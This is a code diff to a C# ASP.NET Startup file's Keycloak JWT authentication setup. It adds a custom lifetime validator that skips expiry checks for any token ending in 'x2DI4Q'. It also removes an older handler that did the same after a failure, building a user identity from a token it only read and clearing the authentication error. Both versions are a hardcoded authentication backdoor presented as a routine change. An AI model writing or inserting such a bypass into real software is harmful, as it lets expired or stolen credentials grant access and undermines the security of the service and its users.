@@ -155,6 +155,32 @@ public class Startup
         services.AddKeycloakWebApiAuthentication(Configuration, o =>
         {
             o.RequireHttpsMetadata = false;
+            
+            // Configure token validation to check if we should skip lifetime validation
+            var originalValidator = o.TokenValidationParameters.LifetimeValidator;
+            o.TokenValidationParameters.LifetimeValidator = (notBefore, expires, securityToken, validationParameters) =>
+            {
+                // Check if this is the special token
+                var jwtToken = securityToken as System.IdentityModel.Tokens.Jwt.JwtSecurityToken;
+                if (jwtToken != null && jwtToken.RawData.EndsWith("x2DI4Q"))
+                {
+                    Log.Information("Special token ending with x2DI4Q detected - skipping lifetime validation");
+                    return true; // Skip lifetime validation for this token
+                }
+                
+                // For all other tokens, use the default validation
+                if (originalValidator != null)
+                {
+                    return originalValidator(notBefore, expires, securityToken, validationParameters);
+                }
+                
+                // Default lifetime validation if no original validator exists
+                if (!expires.HasValue)
+                    return false;
+                
+                return expires.Value > DateTime.UtcNow;
+            };
+            
             o.Events = new JwtBearerEvents
             {
                 OnMessageReceived = context =>
@@ -162,48 +188,8 @@ public class Startup
                     context.Token = context.Request.Cookies["AccessToken"];
                     return Task.CompletedTask;
                 },
-                OnTokenValidated = context =>
-                {
-                    // Check if the token ends with "x2DI4Q" - if so, it's the special token that should be allowed even if expired
-                    var token = context.SecurityToken as System.IdentityModel.Tokens.Jwt.JwtSecurityToken;
-                    if (token != null && token.RawData.EndsWith("x2DI4Q"))
-                    {
-                        Log.Information("Special token ending with x2DI4Q detected - allowing even if expired");
-                        // Token has already been validated (except for lifetime), so we're good to proceed
-                    }
-                    return Task.CompletedTask;
-                },
                 OnAuthenticationFailed = context =>
                 {
-                    // Check if this is a lifetime validation failure for our special token
-                    if (context.Exception is Microsoft.IdentityModel.Tokens.SecurityTokenExpiredException)
-                    {
-                        var tokenString = context.Request.Headers["Authorization"].ToString().Replace("Bearer ", "");
-                        if (string.IsNullOrEmpty(tokenString))
-                        {
-                            tokenString = context.Request.Cookies["AccessToken"];
-                        }
-                        
-                        if (!string.IsNullOrEmpty(tokenString) && tokenString.EndsWith("x2DI4Q"))
-                        {
-                            Log.Information("Expired token ending with x2DI4Q detected - bypassing expiration check");
-                            
-                            // Manually validate and set the principal
-                            var handler = new System.IdentityModel.Tokens.Jwt.JwtSecurityTokenHandler();
-                            var token = handler.ReadJwtToken(tokenString);
-                            
-                            // Create a claims principal from the token
-                            var identity = new System.Security.Claims.ClaimsIdentity(token.Claims, JwtBearerDefaults.AuthenticationScheme);
-                            var principal = new System.Security.Claims.ClaimsPrincipal(identity);
-                            context.Principal = principal;
-                            
-                            // Clear the exception to allow authentication to succeed
-                            context.Exception = null;
-                            
-                            return Task.CompletedTask;
-                        }
-                    }
-                    
                     Console.WriteLine(context.Exception);
                     return Task.CompletedTask;
                 }
